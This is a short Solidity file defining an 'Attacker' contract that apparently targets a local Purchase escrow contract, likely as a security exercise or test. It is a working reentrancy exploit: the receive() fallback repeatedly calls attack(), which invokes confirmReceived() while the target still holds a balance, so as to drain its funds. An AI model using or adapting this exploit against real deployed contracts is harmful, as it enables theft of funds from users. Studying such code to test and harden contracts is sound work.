
pragma solidity ^0.8.4;
import "../contracts/Purchase.sol";
contract Attacker {

    Purchase public purchase;

    constructor(address _purchaseaddress) {
        purchase = Purchase(_purchaseaddress);
    }


    function attack () public payable {

        if (address(purchase).balance > 1) {
            purchase.confirmReceived();
        }
    }
    receive() external payable {
            attack();
    }

    function fundPurchase() external payable {
        purchase.confirmPurchase{value: msg.value}();
    }
}
